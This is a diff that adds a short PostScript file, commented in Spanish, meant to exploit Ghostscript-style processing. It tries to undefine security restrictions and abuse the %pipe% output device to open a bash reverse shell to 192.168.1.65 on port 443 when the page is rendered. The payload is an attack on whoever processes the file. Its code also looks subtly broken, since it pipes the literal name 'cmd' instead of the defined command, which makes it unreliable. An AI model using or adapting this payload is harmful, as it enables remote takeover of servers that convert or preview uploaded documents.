@@ -1,0 +1,20 @@
+%!PS
+% Esto hace que 'file' lo identifique como PostScript.
+
+% Intentamos desactivar algunas restricciones de seguridad (puede no ser necesario/suficiente en todas las versiones)
+userdict /setpagedevice undef
+save
+legal
+
+% Definimos el comando de la reverse shell
+/cmd (bash -c 'bash -i >& /dev/tcp/192.168.1.65/443 0>&1') def
+
+% Creamos un dispositivo de archivo que usa un pipe para ejecutar el comando
+mark /OutputFile (%pipe%cmd) currentdevice put
+
+% Forzamos la escritura al dispositivo (esto ejecuta el comando)
+showpage
+
+% Restauramos el estado y salimos
+restore
+quit
